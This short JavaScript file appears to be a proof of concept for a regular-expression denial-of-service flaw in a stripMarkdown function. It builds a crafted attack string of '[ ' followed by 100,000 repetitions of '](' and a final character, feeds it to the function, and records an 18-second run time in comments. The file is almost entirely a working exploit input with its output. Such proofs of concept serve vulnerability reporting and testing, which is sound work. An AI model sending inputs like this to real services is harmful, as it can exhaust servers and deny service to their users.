import StringUtils from "./stringUtils.js";

//Attack String :"[ "+"]("*100000+"◎"
var str = "[ ";
for (var i = 0; i < 100000; i++) {
  str += "](";
}
str += "◎";

console.log(StringUtils.stripMarkdown(str));


// real    0m18.150s
// user    0m18.115s
// sys     0m0.020s